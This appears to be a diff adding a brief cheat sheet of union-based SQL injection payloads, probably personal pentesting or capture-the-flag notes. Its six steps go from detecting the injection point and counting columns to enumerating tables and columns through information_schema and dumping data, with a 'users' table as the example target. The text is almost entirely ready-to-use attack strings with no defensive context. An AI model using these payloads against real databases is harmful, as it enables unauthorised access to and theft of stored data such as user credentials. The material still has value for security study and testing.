@@ -1,0 +1,6 @@
+1. Detect SQLi ('-- -, 1', '')
+2. Count columns in database() (order by 2-- -)
+3. Database name (union select version(),database()-- -)
+4. Detect table name (union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1-- -) *Group all tables (group_concat(table_name) from information_schema.tables where table_schema=database()
+5. Column name with limit (union select 1,column_name from information_schema.columns where table_name='users' limit 0,1-- -)
+6. Select columns from db (union select COLUMN_NAME_1,COLUMN_NAME_2 from DATABASE.TABLE_NAME-- -)
